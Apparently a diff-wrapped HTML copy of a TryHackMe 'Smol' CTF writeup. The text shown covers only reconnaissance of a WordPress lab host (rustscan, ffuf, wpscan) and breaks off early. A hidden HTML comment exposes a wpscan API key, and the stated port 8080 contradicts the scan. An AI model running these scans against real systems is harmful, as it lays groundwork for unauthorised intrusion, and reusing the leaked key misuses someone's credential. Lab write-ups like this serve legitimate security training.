@@ -1,0 +1,1200 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <title>Smol | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Introduction Detailed walkthroughs for Smol CTF challenges on TryHackMe .
+Description At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
+Enumaration echo 10.10.7.163 smol.thm &gt;&gt; /etc/hosts Mappped the ip to domain smol.thm.
+"
+/>
+<meta
+  name="keywords"
+  content="cyber security, penetration testing, ethical hacking, vulnerability assessment, network security, application security, web application security, security testing, red teaming, bug bounty, CTFs, cybersecurity challenges, hacking tutorials, security tools, exploit development, reverse engineering, penetration tester, security researcher, security analyst, information security, digital forensics, incident response, threat intelligence, security awareness, social engineering, phishing, malware analysis, cryptography, cloud security, IoT security, mobile security, how to become a penetration tester, penetration testing tools, CTF challenges for beginners, web application penetration testing, network penetration testing, exploit development tutorial, reverse engineering techniques, bug bounty hunting tips, security research projects, cyber security certifications"
+/>
+<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" /><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/thm/smol/writeup/">
+  <meta property="og:site_name" content="CyberJagadeesh">
+  <meta property="og:title" content="Smol | THM Writeup">
+  <meta property="og:description" content="Introduction Detailed walkthroughs for Smol CTF challenges on TryHackMe .
+Description At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
+Enumaration echo 10.10.7.163 smol.thm &gt;&gt; /etc/hosts Mappped the ip to domain smol.thm.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-16T09:30:55+05:30">
+    <meta property="article:modified_time" content="2025-02-16T09:30:55+05:30">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="SSRF">
+    <meta property="article:tag" content="CVE-2018-20463">
+    <meta property="article:tag" content="/Etc/Pam.d/Su">
+    <meta property="article:tag" content="Wpscan">
+    <meta property="article:tag" content="Wordpress">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thm/backtrack/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/block/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/pyrat/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Smol | THM Writeup">
+  <meta name="twitter:description" content="Introduction Detailed walkthroughs for Smol CTF challenges on TryHackMe .
+Description At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
+Enumaration echo 10.10.7.163 smol.thm &gt;&gt; /etc/hosts Mappped the ip to domain smol.thm.">
+
+
+<link rel="canonical" href="https://cyberjagadeesh.github.io/posts/thm/smol/writeup/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css">
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-376DY6PW0W');
+        }
+      </script>
+
+
+
+
+  
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2025-02-16T09:30:55+05:30","datePublished":"2025-02-16T09:30:55+05:30","description":"Introduction Detailed walkthroughs for Smol CTF challenges on TryHackMe .\nDescription At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.\nEnumaration echo 10.10.7.163 smol.thm \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain smol.thm.\n","image":"/posts/thm/smol/smol.png","name":"Smol | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/thm/smol/writeup/"}
+</script>
+
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/logo.png" alt="logo">
+    </a>
+  </div>
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/posts/" title="Post">Post</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none mx-1"></div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+        </i>
+        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+        </i>
+      </div>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+    <div>
+      <a href="/posts/thm/smol/writeup/">
+        <figure>
+    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/posts/thm/smol/smol.png"
+      alt="Smol | THM Writeup" title="Smol | THM Writeup"
+      loading="lazy"
+    >
+  </figure>
+      </a>
+    </div>
+    <div class="flex flex-col gap-y-3 p-6">
+      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+        <a href="/posts/thm/smol/writeup/">Smol | THM Writeup</a>
+      </h1>
+
+      
+      
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+      
+      <li>
+        <a href="/categories/ctf/"
+          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
+          CTF
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/tags/lfi/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">LFI</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/ssrf/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">SSRF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/cve-2018-20463/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">CVE-2018-20463</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/etc/pam.d/su/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">/Etc/Pam.d/Su</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/wpscan/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Wpscan</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/wordpress/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Wordpress</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/john/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">John</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/mysql/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Mysql</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/su/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Su</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/series/tryhackme/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Tryhackme</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/platforms/linux/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Linux</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/levels/medium/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Medium</span>
+        </a>
+      </li>
+      
+    
+    
+  </ul>
+
+
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2025-02-16T09:30:55&#43;05:30">
+      2025-02-16
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      11 minutes to read
+    </span>
+  </div>
+</div>
+
+
+      
+        
+        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+          <h2>Table of Contents</h2>
+          <aside><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumaration">Enumaration</a>
+      <ul>
+        <li><a href="#rustscan">Rustscan</a></li>
+        <li><a href="#web-server">Web server</a></li>
+        <li><a href="#ffuf">ffuf</a></li>
+        <li><a href="#wpscan">wpscan</a></li>
+        <li><a href="#hydra">hydra</a></li>
+        <li><a href="#arbitrary-file-readlfi---ssrfcve-2018-20463">Arbitrary file read(LFI)  &amp; SSRF(CVE-2018-20463)</a></li>
+        <li><a href="#webmaster-tasks">Webmaster Tasks!!</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#shell-as-www-data">Shell as www-data</a></li>
+        <li><a href="#improving-shell">Improving shell</a></li>
+        <li><a href="#shell-as-diego">Shell as diego</a></li>
+        <li><a href="#shell-as-think">Shell as think</a></li>
+        <li><a href="#shell-as-gege">Shell as gege</a></li>
+        <li><a href="#etcpamdsu">/etc/pam.d/su</a></li>
+        <li><a href="#shell-as-root">Shell as root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside>
+        </section>
+        
+      
+
+      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+        <h2 id="introduction">Introduction</h2>
+<p>Detailed walkthroughs for <a href="https://tryhackme.com/r/room/smol" target="_blank" rel="noopener">Smol</a>
+ CTF challenges on <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a>
+.</p>
+<h3 id="description">Description</h3>
+<p>At the heart of <code>Smol</code> is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.</p>
+<h2 id="enumaration">Enumaration</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> 10.10.7.163 smol.thm &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Mappped the ip to domain <code>smol.thm</code>.</p>
+<h3 id="rustscan">Rustscan</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ rustscan -a smol.thm -- -sV -sC
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">60</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">60</span> Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://www.smol.thm/
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>We found 2 ports open.</p>
+<ol>
+<li>ssh (22)</li>
+<li>Web server (8080)</li>
+</ol>
+<h3 id="web-server">Web server</h3>
+<p>Lets start exploring webServer.
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/1.png" title="" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong></strong>
+    </figcaption>  
+</figure>
+
+We can see that there is a redirection to <code>http://www.smol.thm/</code>.</p>
+<p>Adding <code>www.smol.thm</code> in <code>/etc/hosts</code> file.</p>
+<pre tabindex="0"><code>10.10.7.163 smol.thm www.smol.thm
+</code></pre><p>
+
+
+
+<figure>
+    <img src="/posts/thm/smol/2.png" title="" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong></strong>
+    </figcaption>  
+</figure>
+
+Now we can access the website.</p>
+<!--
+
+
+
+<figure>
+    <img src="/posts/thm/smol/3.png" title="" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong></strong>
+    </figcaption>  
+</figure>
+
+Wappalzer gives the version information of the site.-->
+<h3 id="ffuf">ffuf</h3>
+<p>Lets fuzz for useful file/directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -u http://www.smol.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt
+</span></span><span class="line"><span class="cl">.htpasswd               <span class="o">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3849ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4876ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status           <span class="o">[</span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 145ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">wp-admin                <span class="o">[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 161ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">wp-content              <span class="o">[</span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 187ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">wp-includes             <span class="o">[</span>Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 167ms<span class="o">]</span>
+</span></span></code></pre></div><h3 id="wpscan">wpscan</h3>
+<!-- wpscan api key: BHKCDV8Kxc3KUUXVDk7cB1ZuDlVMa1otBfxCstWsJBg -->
+<p>Lets use wpscan to get more information about the application.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wpscan --url http://www.smol.thm/ --api-token <span class="nv">$wp_api_key</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> WordPress version 6.4.3 identified <span class="o">(</span>Insecure, released on 2024-01-30<span class="o">)</span>.
